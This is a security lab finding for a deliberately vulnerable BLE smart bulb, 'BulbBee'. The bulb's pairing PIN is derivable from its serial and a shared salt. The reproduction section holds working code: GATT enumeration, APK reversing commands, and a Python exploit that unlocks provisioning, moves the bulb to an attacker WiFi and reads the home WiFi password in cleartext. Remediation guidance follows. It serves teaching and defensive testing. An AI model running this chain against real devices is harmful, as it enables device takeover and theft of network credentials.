---
id: BULB-01
title: "BLE onboarding with a weak, serial-derivable pairing PIN"
category: IoT
status: IN PROGRESS
severity: High
owasp: "OWASP IoT Top 10 (2018) I1 - Weak, Guessable, or Hardcoded Passwords"
standard: "ETSI EN 303 645 5.1 (no universal default passwords)"
regulation: "CRA (EU) 2024/2847 Annex I Part I - secure by default / authentication"
cwe: "CWE-798 (Use of Hard-coded Credentials, the shared vendor salt) / CWE-1391 (Use of Weak Credentials, PIN derivable from the enumerable serial) / CWE-306 (Missing Authentication for a Critical Function, unbonded link)"
affected_components:
  - "labs/bulbbee/files/opt/bulbbee/ble_light.py"
  - "labs/bulbbee/files/opt/bulbbee/config.json"
  - "labs/bulbbee/files/etc/config/bulbbee"
verified_date: "2026-09-04"
---

## Why It Matters

A consumer smart light onboards through the app over BLE: the app hands the bulb the home WiFi SSID and PSK so it can join the network, and pairs it with the cloud. BulbBee accepts that provisioning over an unbonded BLE link gated only by a four-digit pairing PIN. The PIN is per-device, but it is computed from the device serial and a vendor salt by a routine that ships inside the app, and the serial is readable before authentication (on the Auth characteristic, over the debug surface, or from the BLE advertisement). A lockout after five wrong tries blocks brute force, so the PIN is not guessed, it is derived. Anyone within Bluetooth range who has reversed the app and read the serial can compute the PIN, re-provision the bulb onto an attacker-controlled WiFi, and read the stored home WiFi PSK back in cleartext.

For a Cyber Resilience Act default-category product this is the most direct break of the secure-by-default baseline. The impact is device takeover plus theft of the home network credentials, and the bulb becomes a foothold on whatever network the attacker points it at.

## Chain role

In the chained model (see [CHAINS.md](../CHAINS.md)) this finding is a link, not a standalone compromise.

- Yields: a device-bound provisioning unlock, the binding/pair token, and the home WiFi PSK over the authenticated config read.
- Consumes: the per-device PIN, derived from the app key routine (BULB-APP) plus the device serial (BULB-06, the BLE advertisement, or a BULB-03 sniff).
- Unlocks: BULB-02 (mint the control session), BULB-05 (PSK read), BULB-CLD (cloud binding token).

## Root Cause

The BLE server exposes a provisioning service (`0xFF40`, discoverable on connect but deliberately not advertised, which is security by obscurity and not a control) with an Auth characteristic (`0xFF41`) and a Config characteristic (`0xFF42`). Two weaknesses stack (the PIN is derivable and the link is unbonded), while the lockout that used to be missing is now present.

The pairing PIN is per-device but derived from the enumerable serial and a vendor salt that are both recoverable (the salt and the routine ship in the app and the firmware, the serial is exposed pre-auth), so the PIN is predictable rather than secret:

```python
# ble_light.py
VENDOR_SALT = "bulbbee-vendor-salt"             # shared across the whole product line
def _derive_pin(device_id):
    h = hashlib.sha256(("%s:%s" % (VENDOR_SALT, device_id)).encode()).hexdigest()
    return "%04d" % (int(h[:8], 16) % 10000)     # 4-digit PIN = f(serial), the same routine the app ships

# the serial is handed out before auth, so the PIN is derivable by any central:
#   ProvisioningAuthChrc.ReadValue -> {"device_id": <serial>, ...}
```

The Auth characteristic accepts only the derived per-device PIN (the shared `8080` is explicitly rejected) and locks out after five wrong tries, so the four-digit space cannot be brute-forced, the attacker must derive the PIN:

```python
def _prov_auth(pin: str) -> bool:
    if _prov_state["pin_attempts"] >= 5:          # lockout, brute force is out
        return False
    dev = session_token.device_serial()
    if pin != "8080" and pin == _derive_pin(dev): # the shared default is rejected
        _prov_state["authenticated"] = True
        _prov_state["pin_attempts"] = 0
        _prov_state["session"] = session_token.issue(dev, secure=False)  # mints the control session
    else:
        _prov_state["pin_attempts"] += 1
    return _prov_state["authenticated"]
```

The link uses Just Works pairing (no MITM) or no pairing at all, so the derived PIN is the only barrier, and once it is passed the Config characteristic applies `wifi_set` and returns the stored PSK to any caller:

```python
def _prov_apply(cmd):
    if not _prov_state["authenticated"]:
        return                              # the ONLY gate is the derived PIN above
    if cmd.get("cmd") == "wifi_set":
        ...                                 # reconfigures the station WiFi via uci
```

The missing checks are: a pairing secret that is not derivable from public identifiers (the serial) or recoverable from the app, and BLE bonding so an arbitrary central in range cannot drive provisioning at all. The lockout is present, so brute force is not the weakness, derivability is.

## Steps to Reproduce

Default build note: the PIN is per-device, derived from the serial (readable pre-auth, see BULB-06 and the Auth-characteristic read) plus the routine reversed from the app, and it locks out after 5 tries. The shared `8080` below only illustrates the mechanism, it is rejected in the shipped build. See [CHAINS.md](../CHAINS.md).

### Technical analysis: how the exploit script is built

The script at the end of this section does not spring from nowhere. It composes four pieces of information that are not given and must be recovered first: the GATT map (which characteristic UUIDs are the provisioning Auth and Config), the device serial, and the PIN derivation routine with its vendor salt. The three phases below are the reversing and reconnaissance that produce exactly the `AUTH`, `CONFIG`, `serial` and `derive_pin` the script then depends on. They need no credential and no bonding, only a BLE central in range and, for the app reversing, the APK.

**Phase 1 - Enumerate the GATT server (yields the `AUTH` and `CONFIG` UUIDs).**

Tooling is any BLE central: nRF Connect on a phone, `bleak` on a host, or the BlueZ `bluetoothctl` / `gatttool` / `btgatt-client` family. The bulb advertises its name (`BulbBee`) and only the Lighting service `0xFF30`. On connect you discover a second primary service, `0xFF40`, and its two characteristics, which are deliberately not advertised (security by obscurity, not an access control, so discovery still returns them). Service and characteristic discovery returns the full 128-bit UUIDs in the Bluetooth base form `0000ffXX-0000-1000-8000-00805f9b34fb`, which is where every UUID constant in the scripts comes from.

```python
# enumerate everything the peripheral exposes on connect
import asyncio
from bleak import BleakScanner, BleakClient
async def enum():
    d = await BleakScanner.find_device_by_name("BulbBee", timeout=10)
    async with BleakClient(d) as c:
        for s in c.services:                      # 0xFF40 appears here, though unadvertised
            print("service", s.uuid)
            for ch in s.characteristics:
                print("  char", ch.uuid, ch.properties)
asyncio.run(enum())
```

```sh
# BlueZ equivalent, no Python
bluetoothctl            # scan on ; connect <MAC> ; menu gatt ; list-attributes
gatttool -b <MAC> --primary ; gatttool -b <MAC> --characteristics
```

The enumeration tells you the layout: `0xFF31` Control (write), `0xFF32` State (read / notify), `0xFF41` provisioning Auth (read / write), `0xFF42` provisioning Config (read / write / notify). The script's `AUTH = 0xFF41` and `CONFIG = 0xFF42` are simply the two provisioning UUIDs copied out of this step, and BULB-02 reuses `0xFF31` / `0xFF32` the same way.

**Phase 2 - Read the serial before authenticating (yields `serial`).**

The Auth characteristic `0xFF41` returns the serial on a plain unauthenticated read, before any PIN is written, so one GATT read is enough. The same serial is also disclosed by the debug surface (BULB-06) over HTTP, by the device label, and in some builds by the advertisement, so it is enumerable rather than secret. It is the Raspberry Pi serial from `/proc/cpuinfo` (`session_token.device_serial`).

```sh
# option A, over BLE: read 0xFF41 with no PIN -> {"device_id": "<serial>", "attempts": 0, "locked": false}
#   (the main script does this inline with read_gatt_char(AUTH))
# option B, over HTTP: the unauthenticated debug dump (BULB-06)
curl http://192.168.2.1:8082/debug
```

**Phase 3 - Recover the PIN routine and the vendor salt (yields `derive_pin`).**

This is the BULB-APP reversing step. The app no longer ships a usable baked PIN, it ships the derivation routine and the shared salt, so static analysis of the APK yields the algorithm. Pull the installed package, decompile it, and read `BleController.derivePin` plus the `VENDOR_SALT` constant.

```sh
# pull the installed APK off a device that has the app
adb shell pm path com.vulnzoo.bulbbee_app       # -> package:/data/app/.../base.apk
adb pull <that path> bulbbee_app.apk
# decompile to Java and read the routine (apktool + dex2jar also work)
jadx -d out bulbbee_app.apk
#   ble/BleController.java:  VENDOR_SALT = "bulbbee-vendor-salt"
#                            derivePin(serial) = first 4 bytes of sha256("bulbbee-vendor-salt:"+serial), big-endian, % 10000
# quick confirmation without a full decompile
unzip -p bulbbee_app.apk classes.dex | strings | grep -i "bulbbee-vendor-salt"
```

Porting the Java to the script's `derive_pin` is mechanical: SHA-256 over the ASCII string `"bulbbee-vendor-salt:" + serial`, take the first four bytes of the digest big-endian (equivalently the first eight hex characters), reduce modulo 10000, zero-pad to four digits. With a device foothold (SSH root, blank password, or after the BULB-04 OTA) the identical routine is readable firmware-side in `/opt/bulbbee/ble_light.py` (`_derive_pin`) and `session_token.py` (`VENDOR_SALT`), so the app and the firmware agree by construction.

Cross-check the port offline before touching the bulb: the fallback serial `0000000000000000` must derive to `7982`, and `bee-chain-test` to `0783`. If your reimplementation reproduces both, it matches the shipped routine byte-for-byte and the derived PIN will be accepted on the first try (which matters, because the Auth characteristic locks out after five wrong attempts).

With the GATT map from Phase 1, the serial from Phase 2, and the derivation routine from Phase 3 in hand, the script below is only the composition. It re-reads the serial over `0xFF41` to stay self-contained, derives the per-device PIN, unlocks the Auth characteristic, then drives the Config characteristic.

From a BLE central within range of the bulb (a phone with nRF Connect, or a host with `bleak`), no pairing or bonding required. This needs the lab loaded with a Bluetooth adapter (`bulbbee-ble` running).

```python
import asyncio, json
from bleak import BleakScanner, BleakClient
AUTH   = "0000ff41-0000-1000-8000-00805f9b34fb"
CONFIG = "0000ff42-0000-1000-8000-00805f9b34fb"

import hashlib
def derive_pin(serial):   # the routine reversed from the app (BULB-APP)
    h = hashlib.sha256(("bulbbee-vendor-salt:" + serial).encode()).hexdigest()
    return "%04d" % (int(h[:8], 16) % 10000)

async def main():
    dev = await BleakScanner.find_device_by_name("BulbBee", timeout=10)
    async with BleakClient(dev) as c:
        # 1. the provisioning service 0xFF40 is present on connect (not advertised)
        # 2. read the serial from the Auth characteristic (exposed before auth)
        serial = json.loads(await c.read_gatt_char(AUTH))["device_id"]
        # 3. compute the per-device PIN and unlock provisioning (8080 would be rejected)
        await c.write_gatt_char(AUTH, derive_pin(serial).encode())
        # 4. re-provision the bulb onto an attacker network
        await c.write_gatt_char(CONFIG, json.dumps(
            {"cmd": "wifi_set", "ssid": "attacker-ap", "psk": "attackerpass"}).encode())
        # 5. read the stored home WiFi PSK back in cleartext (chains to BULB-05)
        print(json.loads(await c.read_gatt_char(CONFIG)))

asyncio.run(main())
```

Lockout note: the characteristic locks out after five wrong PINs, so a blind `0000`-`9999` sweep does not work. The attack is to derive the PIN from the serial (above), not to brute-force it, and the shared `8080` is rejected.

## Expected Result

- The per-device PIN `derive_pin(serial)` unlocks provisioning, the shared `8080` is rejected, and five wrong PINs lock out the Auth characteristic.
- `wifi_set` reconfigures the bulb's station WiFi, confirmable on the device with `uci get wireless.@wifi-iface[0].ssid` and in `logread` (`Provisioning wifi_set: attacker-ap`).
- Reading `0xFF42` returns the stored `wifi_psk` in cleartext.

## How It Should Be

- Replace the serial-derivable PIN with a per-device secret that is not derivable from the app or from device identifiers (a random pairing code printed on the device or provided as a QR / label).
- Require BLE bonding with LE Secure Connections before any provisioning characteristic is writable, so an unbonded central in range cannot reach the surface.
- Rate-limit and lock out the Auth characteristic after a few failed attempts, with an increasing back-off.
- Never return stored secrets (the WiFi PSK) over the provisioning channel, and close the provisioning window after onboarding completes.

These land behind the `secure` UCI toggle (`bulbbee.@bulbbee[0].secure=1`, target BULB-SEC), so the vulnerable and hardened behaviours can be compared directly.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Device (BLE) | Require LE Secure Connections bonding before the provisioning service is writable | Remove the unauthenticated-in-range surface (CWE-306) |
| Device (auth) | Per-device random pairing secret, not derived from the serial | Remove the weak/derivable credential (CWE-798 / CWE-1391) |
| Device (auth) | Rate limit + lockout with back-off on the Auth characteristic | Stop brute force (CWE-307) |
| Device (data) | Do not expose stored WiFi PSK over provisioning, write-only credentials | Contain the chain into BULB-05 |
| Process | Provisioning window that opens on factory reset and closes after onboarding | Minimize the exposed window (ETSI EN 303 645 5.6) |

## Verification Checklist

- [ ] The provisioning service `0xFF40` is discoverable on connect without pairing, and the `0xFF41` read returns the serial before auth.
- [ ] `derive_pin(serial)` unlocks provisioning, the shared `8080` is rejected, and the PIN differs on a second unit (different serial).
- [ ] Five wrong PINs lock out the Auth characteristic (the correct PIN is then refused until reset).
- [ ] `wifi_set` reconfigures the station WiFi (verified via `uci` / `logread`).
- [ ] Reading `0xFF42` returns the WiFi PSK in cleartext (BULB-05 chain).
- [ ] In `secure` mode, bonding is required, the PIN is per-device with lockout, and the PSK is not readable (BULB-SEC).
